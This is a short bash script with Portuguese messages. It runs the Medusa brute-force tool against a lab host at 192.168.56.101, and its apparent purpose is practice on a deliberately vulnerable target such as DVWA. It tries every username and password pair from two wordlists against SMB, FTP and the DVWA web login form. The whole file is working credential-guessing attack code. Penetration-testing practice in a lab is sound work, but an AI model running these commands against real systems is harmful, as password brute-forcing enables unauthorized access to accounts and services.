#!/bin/bash

IP="192.168.56.101"
USERLIST="../wordlists/usuarios.txt"
PASSLIST="../wordlists/senhas.txt"

echo "Iniciando ataque SMB..."
medusa -h $IP -U $USERLIST -P $PASSLIST -M smbnt

echo "Iniciando ataque FTP..."
medusa -h $IP -U $USERLIST -P $PASSLIST -M ftp

echo "Iniciando ataque Web (DVWA)..."
medusa -h $IP -U $USERLIST -P $PASSLIST -M http -m PAGE:"/dvwa/login.php" 
-m FORM:"username=^USER^&password=^PASS^&Login=Login" -m "FAIL=Login failed"
